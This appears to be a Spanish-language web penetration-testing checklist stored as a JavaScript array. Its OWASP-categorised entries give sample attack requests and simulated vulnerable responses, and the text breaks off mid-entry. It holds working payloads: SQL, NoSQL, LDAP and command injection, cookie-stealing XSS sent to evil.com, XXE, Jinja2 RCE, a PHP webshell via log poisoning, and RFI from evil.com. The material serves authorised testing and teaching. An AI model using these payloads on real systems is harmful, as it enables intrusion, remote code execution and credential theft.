<script>
const CHECKS = [

// ══ A01 – BROKEN ACCESS CONTROL ══════════════════════════════════════════════
{ id:'W-01', cat:'web1', catLabel:'A01 – Broken Access Control', sev:'Media', box:'Gray',
  name:'IDOR - acceso a recursos de otro usuario',
  desc:'Se sustituye el ID de un recurso propio por el de otro usuario en URL, parámetros GET/POST o body. Si el servidor no valida que el recurso pertenece al autenticado, devuelve o permite modificar datos ajenos. Aplica a IDs numéricos, UUIDs o hashes obtenidos de otras respuestas.',
  http:'403 / 404 → correcto\n200 con datos ajenos → vulnerable',
  cid:{c:'Datos de otro usuario expuestos',i:'Modificación o borrado de recursos ajenos',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/perfil?user_id=<span class="t-hl">42</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>   <span class="t-hval">empresa.com</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>   <span class="t-comment">← sesión del usuario 7</span>

<span class="t-comment">// También probar en body y cabeceras:</span>
<span class="t-method">GET</span> <span class="t-path">/facturas/download/<span class="t-hl">99</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

{
  <span class="t-key">"id"</span>:     <span class="t-num t-hl">42</span>,
  <span class="t-key">"nombre"</span>: <span class="t-str">"Ana García"</span>,
  <span class="t-key">"email"</span>:  <span class="t-str t-hl">"ana@empresa.com"</span>,
  <span class="t-key">"dni"</span>:    <span class="t-str t-hl">"12345678A"</span>
}
<span class="t-comment">// datos del usuario 42 devueltos al usuario 7 → IDOR confirmado</span>`, vuln:true },

{ id:'W-02', cat:'web1', catLabel:'A01 – Broken Access Control', sev:'Alta', box:'Gray',
  name:'Escalada vertical - acceso a rutas de admin',
  desc:'Con sesión de rol bajo se accede a rutas o funciones reservadas a admin. El control existe solo en el frontend (menú oculto) pero el backend no valida el rol por endpoint. Se navega directamente a /admin/* o se envían peticiones POST a acciones privilegiadas.',
  http:'403 → correcto\n200 ejecutando función admin → vulnerable',
  cid:{c:'Datos administrativos expuestos',i:'Modificación de configuración o datos de cualquier usuario',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/admin/usuarios</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>   <span class="t-hval">empresa.com</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>   <span class="t-comment">← rol: user</span>

<span class="t-method">POST</span> <span class="t-path">/admin/usuarios/42/delete</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">text/html</span>

<span class="t-str t-hl">&lt;!-- Panel admin renderizado sin validar rol --&gt;
&lt;table&gt; lista de todos los usuarios &lt;/table&gt;</span>
<span class="t-comment">// DELETE también devuelve 200 → usuario eliminado</span>`, vuln:true },

{ id:'W-03', cat:'web1', catLabel:'A01 – Broken Access Control', sev:'Alta', box:'Black',
  name:'Path traversal - lectura de archivos fuera del webroot',
  desc:'Se inyectan secuencias ../ y variantes URL-encoded (%2e%2e%2f, ..%2f, %2e%2e/) en parámetros que referencian archivos. El objetivo es salir del directorio raíz y leer archivos del SO: /etc/passwd, claves privadas, configuración con credenciales.',
  http:'400 / 403 → correcto\nContenido de archivo del SO en respuesta → vulnerable',
  cid:{c:'Archivos de configuración / credenciales del sistema',i:'–',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/download?file=<span class="t-hl">../../../../etc/passwd</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Variantes encoded:</span>
<span class="t-method">GET</span> <span class="t-path">/static/<span class="t-hl">%2e%2e%2f%2e%2e%2fetc%2fpasswd</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/img/<span class="t-hl">..%2F..%2F..%2Fetc%2Fshadow</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">text/plain</span>

<span class="t-str t-hl">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="t-comment">// /etc/passwd devuelto → path traversal confirmado</span>`, vuln:true },

{ id:'W-04', cat:'web1', catLabel:'A01 – Broken Access Control', sev:'Alta', box:'Black',
  name:'HTTP Verb Tampering - bypass por método alternativo',
  desc:'Se prueban métodos HTTP alternativos (PUT, DELETE, PATCH, HEAD, OPTIONS, TRACE) en endpoints documentados solo para GET/POST. Algunos frameworks bypasean controles de autorización si el método no está en la lista de verificación. TRACE puede reflejar cabeceras de sesión (Cross-Site Tracing).',
  http:'405 para métodos no soportados → correcto\n200/204 con acción ejecutada por método no documentado → vulnerable',
  cid:{c:'Cabeceras de sesión reflejadas via TRACE',i:'Modificación no autorizada con PUT/DELETE sin controles',d:'–'},
  req:`<span class="t-comment">// Enumerar métodos con OPTIONS</span>
<span class="t-method">OPTIONS</span> <span class="t-path">/cuenta/cambiar-email</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Probar método no documentado</span>
<span class="t-method">DELETE</span> <span class="t-path">/usuarios/42</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>

<span class="t-comment">// Cross-Site Tracing</span>
<span class="t-method">TRACE</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>`,
  res:`<span class="t-comment">// OPTIONS:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-so">204 No Content</span>
<span class="t-hname">Allow:</span> <span class="t-hval">GET, POST, DELETE, OPTIONS</span>   <span class="t-comment">← DELETE expuesto</span>

<span class="t-comment">// TRACE refleja la cookie:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Cookie:</span> <span class="t-hval t-hl">session=abc123</span>   <span class="t-comment">← XST: session visible via TRACE</span>`, vuln:true },

{ id:'W-05', cat:'web1', catLabel:'A01 – Broken Access Control', sev:'Alta', box:'Black',
  name:'Open Redirect - redirección a dominio externo',
  desc:'Se manipulan parámetros de redirección (next, redirect, url, return_to, continue) para apuntar a un dominio externo controlado por el atacante. Si el servidor no valida que la URL pertenece al dominio propio, el usuario es redirigido tras login o logout. Se usa para phishing creíble (la URL de origen es legítima) y para robo de tokens OAuth en el redirect_uri.',
  http:'Redirección solo a rutas relativas o dominio propio → correcto\nRedirección a dominio externo → vulnerable',
  cid:{c:'Tokens OAuth robados via redirect_uri malicioso',i:'–',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/login?next=<span class="t-hl">https://evil.com</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Variantes para bypass de validación:</span>
<span class="t-method">GET</span> <span class="t-path">/login?next=<span class="t-hl">//evil.com</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/login?next=<span class="t-hl">/\evil.com</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/login?next=<span class="t-hl">https://empresa.com.evil.com</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">302 Found</span>
<span class="t-hname">Location:</span> <span class="t-hval t-hl">https://evil.com</span>

<span class="t-comment">// usuario redirigido al dominio del atacante tras autenticarse</span>
<span class="t-comment">// en OAuth: el access_token se envía al redirect_uri del atacante</span>`, vuln:true },

// ══ A02 – CRYPTOGRAPHIC FAILURES ═════════════════════════════════════════════
{ id:'W-06', cat:'web2', catLabel:'A02 – Cryptographic Failures', sev:'Baja', box:'Black',
  name:'HTTP sin TLS / HSTS ausente / cookie sin Secure',
  desc:'Se verifica si la app acepta HTTP en claro sin redirigir a HTTPS, si el header Strict-Transport-Security está presente y si las cookies de sesión tienen el flag Secure. La ausencia expone credenciales a ataques MITM en redes no confiables y facilita SSL stripping.',
  http:'301/302 a HTTPS + HSTS + cookie con Secure → correcto\nHTTP directo sin redirección → vulnerable',
  cid:{c:'Credenciales y tokens en tránsito',i:'Sesión secuestrada via MITM',d:'–'},
  req:`<span class="t-comment">// Prueba 1: petición directa HTTP</span>
<span class="t-method">GET</span> <span class="t-path">http://empresa.com/login</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Prueba 2: headers en respuesta HTTPS</span>
<span class="t-method">GET</span> <span class="t-path">https://empresa.com/</span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-comment">// HTTP sin redirigir → vulnerable:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>   <span class="t-comment">← sin 301 a HTTPS</span>

<span class="t-comment">// Respuesta HTTPS con problemas:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Set-Cookie:</span> <span class="t-hval t-hl">session=abc123; HttpOnly</span>  <span class="t-comment">← falta Secure y SameSite</span>
<span class="t-comment">// Strict-Transport-Security: AUSENTE → SSL stripping posible</span>`, vuln:true },

{ id:'W-07', cat:'web2', catLabel:'A02 – Cryptographic Failures', sev:'Alta', box:'Gray',
  name:'Contraseñas con hash débil (MD5/SHA1) o en claro',
  desc:'Mediante dump de BD (post-SQLi u otro vector) o via respuesta de endpoint de debug, se verifica el algoritmo de hash. MD5 y SHA1 son crackeables offline en segundos. El estándar es bcrypt/argon2/scrypt con salt único por usuario. Se verifica también si contraseñas aparecen en claro en logs o respuestas.',
  http:'No aplica directamente - hallazgo en datos expuestos\nHash bcrypt/argon2 → correcto\nMD5/SHA1 o en claro → vulnerable',
  cid:{c:'Contraseñas recuperables por fuerza bruta offline',i:'–',d:'–'},
  req:`<span class="t-comment">// Via SQLi o endpoint de debug:</span>
<span class="t-method">GET</span> <span class="t-path">/debug/users</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>

<span class="t-comment">// O via UNION-based SQLi:</span>
<span class="t-method">GET</span> <span class="t-path">/buscar?q=<span class="t-hl">' UNION SELECT email,password FROM users--</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

[
  { <span class="t-key">"email"</span>: <span class="t-str">"admin@empresa.com"</span>,
    <span class="t-key">"password"</span>: <span class="t-str t-hl">"5f4dcc3b5aa765d61d8327deb882cf99"</span> },
    <span class="t-comment">← MD5("password") - crackeable en &lt;1s</span>
  { <span class="t-key">"email"</span>: <span class="t-str">"user@empresa.com"</span>,
    <span class="t-key">"password"</span>: <span class="t-str t-hl">"MiContraseña123"</span> }
    <span class="t-comment">← en claro → crítico</span>
]`, vuln:true },

{ id:'W-08', cat:'web2', catLabel:'A02 – Cryptographic Failures', sev:'Media', box:'Black',
  name:'Exposición de datos sensibles en almacenamiento del cliente',
  desc:'Se inspecciona localStorage, sessionStorage, cookies del navegador y comentarios HTML en busca de tokens, credenciales, datos personales o información de sesión almacenados sin cifrar en el cliente. Un XSS o acceso físico al dispositivo puede exfiltrar estos datos. También se verifica si el código fuente JS expuesto contiene claves API o secretos hardcodeados.',
  http:'No aplica directamente - revisión en browser DevTools\nDatos sensibles en storage → hallazgo',
  cid:{c:'Tokens / credenciales / PII en almacenamiento del cliente',i:'–',d:'–'},
  req:`<span class="t-comment">// Inspeccionar en DevTools → Application → Storage:</span>
<span class="t-comment">// localStorage: getItem('token'), getItem('user')</span>
<span class="t-comment">// sessionStorage: sessionStorage</span>
<span class="t-comment">// Cookies: document.cookie</span>

<span class="t-comment">// Buscar secretos en JS:</span>
<span class="t-method">GET</span> <span class="t-path">/static/app.bundle.js</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-comment">// grep: apiKey, secret, password, token, AWS_</span>`,
  res:`<span class="t-comment">// localStorage contiene:</span>
<span class="t-str t-hl">authToken: "eyJhbGciOiJIUzI1NiJ9..."</span>   <span class="t-comment">← JWT sin HttpOnly</span>
<span class="t-str t-hl">userData: {"email":"admin@empresa.com","role":"admin"}</span>

<span class="t-comment">// En app.bundle.js:</span>
<span class="t-str t-hl">const STRIPE_KEY = "sk_live_aBcDeFgHiJkLmNoPqRsTuVwX";</span>
<span class="t-str t-hl">const AWS_KEY    = "AKIAIOSFODNN7EXAMPLE";</span>
<span class="t-comment">// claves hardcodeadas en JS público → hallazgo crítico</span>`, vuln:true },

{ id:'W-09', cat:'web2', catLabel:'A08 – Software & Data Integrity', sev:'Informativa', box:'Black',
  name:'Revisión de estáticos JS - secretos y endpoints ocultos',
  desc:'Se descargan y analizan los archivos JavaScript del frontend en busca de: claves API hardcodeadas, endpoints no documentados (rutas /api/admin, /internal), tokens de terceros (Stripe, AWS, Firebase), comentarios con información de debug, y credenciales. Se usan herramientas como js-beautify + grep, o la extensión JS Miner de Burp.',
  http:'No aplica directamente - análisis estático de JS\nSecretos encontrados → hallazgo según impacto',
  cid:{c:'Claves API, secretos, endpoints internos expuestos',i:'–',d:'–'},
  req:`<span class="t-comment">// Descargar todos los JS de la app:</span>
<span class="t-method">GET</span> <span class="t-path">/static/js/main.chunk.js</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/static/js/vendors~main.chunk.js</span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// Beautify y buscar patrones:</span>
<span class="t-comment">// grep -E "(api[_-]?key|secret|password|token|AWS|sk_live|pk_live)" *.js</span>
<span class="t-comment">// grep -E '"/api/[a-z/]+"' *.js   ← endpoints ocultos</span>`,
  res:`<span class="t-comment">// Fragmento del JS desofuscado:</span>
<span class="t-str t-hl">const STRIPE_SECRET = "sk_live_aBcDeFgHiJkLmNoPqRsTuVwX";</span>
<span class="t-str t-hl">const FIREBASE_KEY  = "AIzaSyBxxx-xxx-xxxxxxxxxxxxx";</span>
<span class="t-str t-hl">fetch("/api/internal/admin/users/export")</span>   <span class="t-comment">← endpoint no documentado</span>
<span class="t-str t-hl">// TODO: remove before prod - password: Dev2024!</span>
<span class="t-comment">// secretos y endpoints encontrados en JS público</span>`, vuln:true },

// ══ A03 – INJECTION ══════════════════════════════════════════════════════════
{ id:'W-10', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'SQL Injection',
  desc:'Se inyectan payloads SQL en parámetros de búsqueda, formularios, cabeceras HTTP y cookies. Se confirma con comilla simple (error) u otras técnicas (boolean based, blind based, OOB). Se debe de obtener el nombre de la base de datos para confirmar la vulnerabilidad y no ir más allá dumpeando toda la base de datos.',
  http:'500 con mensaje SQL → indicador\nDatos de otras tablas en respuesta → SQLi confirmado',
  cid:{c:'Cualquier dato de la BD (credenciales, PII)',i:'INSERT/UPDATE/DELETE arbitrario',d:'DROP TABLE / borrado de datos'},
  req:`<span class="t-comment">// Detección con comilla simple</span>
<span class="t-method">GET</span> <span class="t-path">/buscar?q=<span class="t-hl">laptop'</span></span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// UNION para extraer usuarios</span>
<span class="t-method">GET</span> <span class="t-path">/buscar?q=<span class="t-hl">x' UNION SELECT null,username,password,null FROM users--</span></span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// SQLi en cabecera User-Agent</span>
<span class="t-method">GET</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">User-Agent:</span> <span class="t-hval t-hl">'; INSERT INTO admins VALUES('hack','hash')--</span>`,
  res:`<span class="t-comment">// Error SQL visible:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">500 Internal Server Error</span>
<span class="t-str t-hl">You have an error in your SQL syntax near ''' at line 1</span>

<span class="t-comment">// UNION: datos de users en respuesta de productos:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
[{ <span class="t-key">"nombre"</span>:<span class="t-str t-hl">"admin"</span>, <span class="t-key">"precio"</span>:<span class="t-str t-hl">"5f4dcc3b5aa765d61d8327deb882cf99"</span> }]
<span class="t-comment">// username y password_hash en columnas del resultado → SQLi confirmado</span>`, vuln:true },

{ id:'W-11', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'NoSQL Injection',
  desc:'Se inyectan operadores de MongoDB/NoSQL ($ne, $gt, $regex, $where) en parámetros de login o búsqueda enviados como JSON o form-data. El operador $ne:"" convierte un filtro de autenticación en una condición siempre verdadera, permitiendo bypass. Con $regex y $where se pueden enumerar datos o extraer campos campo a campo.',
  http:'401 con credenciales inválidas → correcto\nAutenticación bypaseada o datos exfiltrados → NoSQLi confirmado',
  cid:{c:'Cualquier dato de la colección NoSQL',i:'Bypass de autenticación, modificación de documentos',d:'–'},
  req:`<span class="t-comment">// Bypass de autenticación con operador $ne</span>
<span class="t-method">POST</span> <span class="t-path">/login</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/json</span>

{
  <span class="t-key">"username"</span>: <span class="t-str t-hl">{"$ne": ""}</span>,
  <span class="t-key">"password"</span>: <span class="t-str t-hl">{"$ne": ""}</span>
}

<span class="t-comment">// Enumeración por regex (extracción char a char)</span>
{
  <span class="t-key">"username"</span>: <span class="t-str">"admin"</span>,
  <span class="t-key">"password"</span>: <span class="t-str t-hl">{"$regex": "^S"}</span>
}

<span class="t-comment">// En form-data: parámetro array notation</span>
<span class="t-key">username[$ne]</span>=x&<span class="t-key">password[$ne]</span>=x`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">302 Found</span>
<span class="t-hname">Location:</span>   <span class="t-hval">/dashboard</span>
<span class="t-hname">Set-Cookie:</span> <span class="t-hval t-hl">session=eyJhbGci...</span>

<span class="t-comment">// autenticado sin credenciales válidas → NoSQLi confirmado</span>
<span class="t-comment">// regex: 302 cuando la regex coincide, 401 cuando no → extracción char a char posible</span>`, vuln:true },

{ id:'W-12', cat:'web3', catLabel:'A03 – Injection', sev:'Media', box:'Black',
  name:'XSS',
  desc:'XSS reflejado: payload en GET se refleja sin sanitizar. XSS almacenado: payload guardado en BD (comentario, perfil) ejecutado para todos los visitantes. DOM-based: payload procesado por JS en cliente (document.location, innerHTML) sin pasar por servidor. En todos los casos se exfiltran cookies o se ejecuta código arbitrario en el navegador de la víctima.',
  http:'Script no ejecutado / escapado en respuesta → correcto\nScript ejecutado en navegador → vulnerable',
  cid:{c:'Cookie de sesión robada (account takeover)',i:'DOM manipulado, keylogging, redirección',d:'–'},
  req:`<span class="t-comment">// XSS reflejado</span>
<span class="t-method">GET</span> <span class="t-path">/buscar?q=<span class="t-hl">&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</span></span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// XSS almacenado en comentario</span>
<span class="t-method">POST</span> <span class="t-path">/comentarios</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>
<span class="t-key">texto</span>=<span class="t-hl">&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</span>

<span class="t-comment">// DOM-based: fragment procesado por JS</span>
<span class="t-method">GET</span> <span class="t-path">/app#<span class="t-hl">&lt;img src=x onerror=alert(document.domain)&gt;</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">X-XSS-Protection:</span> <span class="t-hval t-hl">0</span>   <span class="t-comment">← deshabilitado</span>

<span class="t-str">Resultados para: </span><span class="t-hl">&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</span>
<span class="t-comment">// script no escapado → ejecutado por el navegador</span>`, vuln:true },

{ id:'W-13', cat:'web3', catLabel:'A03 – Injection', sev:'Crítica', box:'Black',
  name:'Command Injection',
  desc:'Se inyectan metacaracteres del shell (;, |, &&, `cmd`, $(cmd)) en parámetros que el servidor usa para construir comandos del SO (ping, nslookup, convert, zip). Si el input no se sanitiza, el atacante ejecuta comandos arbitrarios. Para detección blind se usa sleep con delay de 5s o pingback a Burp Collaborator.',
  http:'Respuesta normal sin output del SO → correcto\nOutput del SO en respuesta o delay 5s → vulnerable',
  cid:{c:'Sistema de archivos / datos del servidor',i:'RCE - webshell, modificación de archivos',d:'Borrado de archivos del servidor'},
  req:`<span class="t-method">POST</span> <span class="t-path">/tools/ping</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-key">host</span>=<span class="t-hl">127.0.0.1; id; whoami</span>

<span class="t-comment">// Blind time-based:</span>
<span class="t-key">host</span>=<span class="t-hl">127.0.0.1 | sleep 5</span>

<span class="t-comment">// OOB via Collaborator:</span>
<span class="t-key">host</span>=<span class="t-hl">127.0.0.1; curl https://xyz.oastify.com/$(whoami)</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

<span class="t-str">PING 127.0.0.1 ... OK</span>
<span class="t-str t-hl">uid=33(www-data) gid=33(www-data)</span>
<span class="t-str t-hl">www-data</span>
<span class="t-comment">// output de id y whoami → RCE confirmado</span>`, vuln:true },

{ id:'W-14', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'LDAP Injection - bypass de autenticación corporativa',
  desc:'Si la app autentica contra Active Directory/OpenLDAP, se inyectan metacaracteres LDAP (*)(|)(&!) en campos de usuario/contraseña. El payload *)(&) cierra el filtro LDAP prematuro y puede bypassear la autenticación por completo o devolver todos los registros del directorio. Común en intranets corporativas.',
  http:'401 / credenciales inválidas normalmente → correcto\nAutenticación bypaseada o datos del directorio expuestos → vulnerable',
  cid:{c:'Datos del directorio LDAP / AD expuestos',i:'Bypass de autenticación corporativa',d:'–'},
  req:`<span class="t-method">POST</span> <span class="t-path">/login</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-comment">// Bypass de autenticación LDAP</span>
<span class="t-key">username</span>=<span class="t-hl">*)(&</span>&<span class="t-key">password</span>=<span class="t-hl">*</span>

<span class="t-comment">// Enumeración por wildcard</span>
<span class="t-key">username</span>=<span class="t-hl">admin*</span>&<span class="t-key">password</span>=cualquiera`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">302 Found</span>
<span class="t-hname">Location:</span> <span class="t-hval">/dashboard</span>
<span class="t-hname">Set-Cookie:</span> <span class="t-hval t-hl">session=newToken123</span>

<span class="t-comment">// autenticado como admin sin contraseña → LDAP injection confirmado</span>`, vuln:true },

{ id:'W-15', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'XXE - External Entity en parseo de XML',
  desc:'Si la app acepta XML (importación de archivos, SOAP, SVG, DOCX), se inyecta una entidad externa que referencia archivos del servidor (/etc/passwd) o URLs internas. XXE puede derivar en lectura de archivos, SSRF interno y en algunos casos RCE. Se prueba también con file upload de SVG y archivos Office maliciosos.',
  http:'Error de parseo → revisar\nContenido del archivo referenciado en respuesta → XXE confirmado',
  cid:{c:'Archivos del sistema / secretos de config',i:'SSRF interno via XXE',d:'–'},
  req:`<span class="t-method">POST</span> <span class="t-path">/importar</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/xml</span>

<span class="t-str t-hl">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;datos&gt;&lt;nombre&gt;&amp;xxe;&lt;/nombre&gt;&lt;/datos&gt;</span>

<span class="t-comment">// Blind XXE via OOB:</span>
<span class="t-str t-hl">&lt;!ENTITY xxe SYSTEM "http://xyz.oastify.com/test"&gt;</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

{
  <span class="t-key">"nombre"</span>: <span class="t-str t-hl">"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1..."</span>
}
<span class="t-comment">// contenido de /etc/passwd reflejado en respuesta → XXE confirmado</span>`, vuln:true },

{ id:'W-16', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'SSTI - Server-Side Template Injection',
  desc:'Se inyectan expresiones de template ({{7*7}}, ${7*7}, #{7*7}) en campos que el servidor renderiza con un motor de plantillas (Jinja2, Twig, Freemarker, Pebble, Handlebars). Si el servidor evalúa la expresión, un atacante puede escalar a RCE accediendo a clases del runtime del servidor.',
  http:'Expresión evaluada en respuesta (49) → SSTI confirmado\nExpresión mostrada en texto → correcto',
  cid:{c:'–',i:'RCE via evaluación de código en el template engine',d:'–'},
  req:`<span class="t-comment">// Detección - inyectar en parámetro de nombre, búsqueda, mensaje, etc.</span>
<span class="t-method">GET</span> <span class="t-path">/saludo?nombre=<span class="t-hl">{{7*7}}</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/saludo?nombre=<span class="t-hl">${7*7}</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/saludo?nombre=<span class="t-hl">#{7*7}</span></span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// RCE en Jinja2:</span>
<span class="t-method">GET</span> <span class="t-path">/saludo?nombre=<span class="t-hl">{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-comment">// Expresión evaluada - SSTI confirmado:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

<span class="t-str">Hola, <span class="t-hl">49</span>!</span>
<span class="t-comment">// 7*7=49 evaluado por el template engine</span>

<span class="t-comment">// Con payload de RCE:</span>
<span class="t-str t-hl">uid=33(www-data) gid=33(www-data)</span>`, vuln:true },

{ id:'W-17', cat:'web3', catLabel:'A03 – Injection', sev:'Alta', box:'Black',
  name:'LFI - Local File Inclusion via parámetro de archivo',
  desc:'Se inyectan rutas locales en parámetros que el servidor usa para incluir archivos PHP/otros (include, require, file_get_contents). A diferencia de path traversal, LFI ejecuta el archivo incluido como código si es PHP. Si el servidor tiene wrappers habilitados, se puede exfiltrar código fuente con php://filter o inyectar código via log poisoning.',
  http:'Archivo no encontrado / 400 → correcto\nContenido de archivo del sistema en respuesta → LFI confirmado',
  cid:{c:'Código fuente, archivos de configuración, /etc/passwd',i:'RCE via log poisoning o wrapper php://input',d:'–'},
  req:`<span class="t-comment">// Detección básica</span>
<span class="t-method">GET</span> <span class="t-path">/index.php?page=<span class="t-hl">../../../../etc/passwd</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// PHP wrapper - leer código fuente en base64</span>
<span class="t-method">GET</span> <span class="t-path">/index.php?page=<span class="t-hl">php://filter/convert.base64-encode/resource=config.php</span></span> <span class="t-proto">HTTP/1.1</span>

<span class="t-comment">// Log poisoning - inyectar payload en User-Agent primero:</span>
<span class="t-hname">User-Agent:</span> <span class="t-hval t-hl">&lt;?php system($_GET['cmd']); ?&gt;</span>
<span class="t-comment">// Luego incluir el log:</span>
<span class="t-method">GET</span> <span class="t-path">/index.php?page=<span class="t-hl">../../../../var/log/apache2/access.log</span>&cmd=id</span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-comment">// LFI básico - /etc/passwd devuelto:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-str t-hl">root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>

<span class="t-comment">// php://filter - config.php en base64:</span>
<span class="t-str t-hl">PD9waHAKJGRiX3Bhc3N3b3JkID0gIlN1cGVyU2VjcmV0MjAyNCI7Cg==</span>
<span class="t-comment">// decode: $db_password = "SuperSecret2024";</span>`, vuln:true },

{ id:'W-18', cat:'web3', catLabel:'A03 – Injection', sev:'Crítica', box:'Black',
  name:'RFI - Remote File Inclusion desde URL externa',
  desc:'Si allow_url_include está habilitado en PHP (configuración insegura), se puede incluir un archivo remoto controlado por el atacante. La URL externa se carga y ejecuta como PHP en el servidor. Esto deriva directamente en RCE. Menos común que LFI en configuraciones modernas pero presente en PHP legacy y CMSs antiguos.',
  http:'Error / recurso remoto no cargado → correcto\nCódigo del archivo remoto ejecutado → RCE confirmado',
  cid:{c:'–',i:'RCE - ejecución de código PHP arbitrario del atacante',d:'–'},
  req:`<span class="t-comment">// Shell PHP alojada en servidor del atacante:</span>
<span class="t-comment">// https://evil.com/shell.txt contiene: &lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="t-method">GET</span> <span class="t-path">/index.php?page=<span class="t-hl">http://evil.com/shell.txt</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Con comando:</span>
<span class="t-method">GET</span> <span class="t-path">/index.php?page=<span class="t-hl">http://evil.com/shell.txt</span>&cmd=<span class="t-hl">id;whoami;cat /etc/passwd</span></span> <span class="t-proto">HTTP/1.1</span>`,
